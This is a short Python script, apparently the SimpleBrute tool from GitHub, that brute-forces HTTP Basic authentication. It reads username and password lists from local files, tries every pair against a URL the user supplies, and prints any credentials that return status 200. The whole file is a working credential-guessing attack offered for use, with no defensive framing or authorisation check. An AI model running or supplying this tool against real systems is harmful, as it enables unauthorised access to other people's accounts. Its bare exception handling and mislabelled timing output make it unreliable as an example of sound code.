# -*- coding: utf-8 -*-
#Coded By Ashkan Rafiee https://github.com/AshkanRafiee/SimpleBrute/
import requests


def readfile(file):
    with open(file) as f:
        content = f.readlines()
    # remove whitespace characters like `\n` at the end of each line
    content = [x.strip() for x in content]
    return content


def bruteforce(usernames, passwords, url):
    for username in usernames:
        for password in passwords:
            try:
                userpass = (username, password)

                req = requests.get(url, auth=userpass)

                if req.status_code == 200:
                    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                    print("username is : ", userpass[0])
                    print("password is : ", userpass[1])
                    print("Status Code: ", req.status_code)
                    print(f"Request completed in {req.elapsed}ms")
                    print("++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
                else:
                    print(f"Didn't match: {userpass}")
                    print("Status Code: ", req.status_code)
                    print(f"Request completed in {req.elapsed}ms\n")
            except:
                print("Something is wrong! - Probably Connection Issues!")


def main():
    url = input("Enter URL: ")
    print("Getting user and pass from files...")
    passwords = readfile('passwords.txt')
    usernames = readfile('usernames.txt')
    print("Making Request to URL...")
    bruteforce(usernames, passwords, url)


if __name__ == '__main__':
    main()
